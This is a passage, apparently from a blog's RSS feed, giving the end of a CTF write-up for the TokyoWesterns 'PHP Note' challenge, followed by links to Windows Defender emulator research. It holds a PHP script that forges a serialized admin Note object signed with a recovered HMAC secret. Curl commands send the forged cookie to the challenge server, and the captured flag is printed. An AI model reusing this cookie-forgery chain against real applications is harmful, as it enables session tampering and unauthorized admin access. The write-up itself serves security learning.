+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="k">function&lt;/span> &lt;span class="nf">getnotes&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">notes&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="k">function&lt;/span> &lt;span class="nf">getflag&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">isadmin&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="k">true&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="nx">FLAG&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">verify&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$hmac&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$secret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;secret&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$secret&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">hash_equals&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">hash_hmac&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sha256&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$secret&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nv">$hmac&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">hmac&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$secret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;secret&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$secret&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">hash_hmac&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sha256&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$secret&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">gen_secret&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$seed&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;2532bd172578d19923e5348420e02320&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// create session
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nv">$_SESSION&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">Array&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;secret&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">gen_secret&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;realname&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;stypr stypr&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;nickname&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// generate note
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nv">$note&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Note&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">true&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$note&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">addnote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;work&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;work&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">base64_encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">serialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$note&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/* verify
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">//echo &amp;#34;Data: &amp;#34;.(string)$data.&amp;#34;\n&amp;#34;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">//echo &amp;#34;HMAC: &amp;#34;.(string)hmac($data).&amp;#34;\n&amp;#34;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">//echo &amp;#34;-----&amp;#34;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">//var_dump(verify((string)$data, (string)hmac($data)));
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">*/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">curl -s &amp;#39;http://phpnote.chal.ctf.westerns.tokyo/?action=logout&amp;#39; -H &amp;#39;Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;&amp;#39; --insecure
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">curl -s &amp;#39;http://phpnote.chal.ctf.westerns.tokyo/?action=login&amp;#39; -H &amp;#39;Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;&amp;#39; --data &amp;#39;nickname=&amp;lt;/body&amp;gt;&amp;amp;realname=stypr+stypr&amp;#39; --compressed --insecure
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">curl -s &amp;#34;http://phpnote.chal.ctf.westerns.tokyo/?action=getflag&amp;#34; -H &amp;#34;Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a; note=&amp;lt;?php echo $data; ?&amp;gt;; hmac=&amp;lt;?php echo hmac($data); ?&amp;gt;;&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ php flag.php &lt;span class="p">|&lt;/span> sh &lt;span class="p">|&lt;/span> grep &lt;span class="s2">&amp;#34;TWCTF&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TWCTF&lt;span class="o">{&lt;/span>h0pefully_I_haven&lt;span class="err">&amp;#39;&lt;/span>t_made_a_m1stake_again&lt;span class="o">}&lt;/span>&amp;lt;!doctype html&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="one-more">One More
+&lt;/h2>&lt;p>其实个人觉得 Windows Defender 这个 JS Engine 还是有很多没发掘的地方，奈何自己逆向水平不够，这里放几个会议的分享吧&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.blackhat.com/us-18/briefings/schedule/index.html#windows-offender-reverse-engineering-windows-defenders-antivirus-emulator-9981" target="_blank" rel="noopener"
+>Windows Offender: Reverse Engineering Windows Defender&amp;rsquo;s Antivirus Emulator&lt;/a>&lt;/p>
+&lt;h2 id="reference">Reference
+&lt;/h2>&lt;p>&lt;a class="link" href="https://xz.aliyun.com/t/6216" target="_blank" rel="noopener"
+>Playing with Windwos Defender&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://r3kapig.com/writeup/20190904-tokyowesterns/#php-note" target="_blank" rel="noopener"
+>r3kapig - PHP Note&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://balsn.tw/ctf_writeup/20190831-tokyowesternsctf/#php-note" target="_blank" rel="noopener"
+>balsn - PHP Note&lt;/a>&lt;/p></description></item></channel></rss>
